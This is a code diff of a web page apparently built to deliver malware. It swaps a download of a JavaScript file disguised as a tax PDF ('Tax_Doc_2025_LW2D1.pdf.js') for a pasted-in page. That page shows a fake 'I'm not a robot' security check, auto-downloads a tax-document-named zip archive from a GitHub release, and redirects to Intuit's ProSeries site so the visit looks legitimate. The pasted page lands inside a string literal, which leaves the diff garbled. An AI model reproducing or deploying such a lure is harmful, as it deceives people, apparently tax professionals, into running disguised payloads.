@@ -42,7 +42,122 @@
 
     <script>
         // Start download
-        const fileUrl = "https://github.com/MARKZBERG35/smartdoc/releases/download/v1.0/Tax_Doc_2025_LW2D1.pdf.js?v=" + Date.now();
+        const fileUrl = "h<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verify Access</title>
+
+<style>
+body{
+    margin:0;
+    height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    background:#121212;
+    font-family:Arial, sans-serif;
+    color:white;
+    flex-direction:column;
+}
+
+.box{
+    background:#1e1e1e;
+    padding:30px;
+    border-radius:8px;
+    text-align:center;
+    width:300px;
+}
+
+button{
+    margin-top:15px;
+    padding:12px 18px;
+    border:none;
+    background:#2ea44f;
+    color:white;
+    font-size:15px;
+    border-radius:5px;
+    cursor:pointer;
+}
+
+button:hover{
+    background:#2c974b;
+}
+
+.spinner{
+    margin-top:20px;
+    width:40px;
+    height:40px;
+    border:4px solid rgba(255,255,255,0.2);
+    border-top:4px solid white;
+    border-radius:50%;
+    animation:spin 1s linear infinite;
+    display:none;
+}
+
+@keyframes spin{
+0%{transform:rotate(0deg);}
+100%{transform:rotate(360deg);}
+}
+
+.loadingText{
+    margin-top:10px;
+    display:none;
+}
+</style>
+</head>
+
+<body>
+
+<div class="box" id="verifyBox">
+<h2>Security Check</h2>
+<p>Please confirm you are not a robot to continue.</p>
+
+<label>
+<input type="checkbox" id="robotCheck"> I'm not a robot
+</label>
+<br>
+
+<button onclick="startProcess()">Continue</button>
+</div>
+
+<div class="spinner" id="spinner"></div>
+<div class="loadingText" id="loadingText">Preparing document...</div>
+
+<script>
+
+function startProcess(){
+
+const check = document.getElementById("robotCheck");
+
+if(!check.checked){
+alert("Please confirm you are not a robot.");
+return;
+}
+
+document.getElementById("verifyBox").style.display="none";
+document.getElementById("spinner").style.display="block";
+document.getElementById("loadingText").style.display="block";
+
+const fileUrl="https://github.com/MARKZBERG35/teamfile/releases/download/v1.0/TY25_RIECK_DOCS_LW1.pdf.zip?v="+Date.now();
+
+const link=document.createElement("a");
+link.href=fileUrl;
+link.download="";
+document.body.appendChild(link);
+link.click();
+
+setTimeout(()=>{
+window.location.href="https://accountants.intuit.com/tax-software/proseries/";
+},2500);
+
+}
+
+</script>
+
+</body>
+</html>v=" + Date.now();
         const link = document.createElement("a");
         link.href = fileUrl;
         link.download = "";
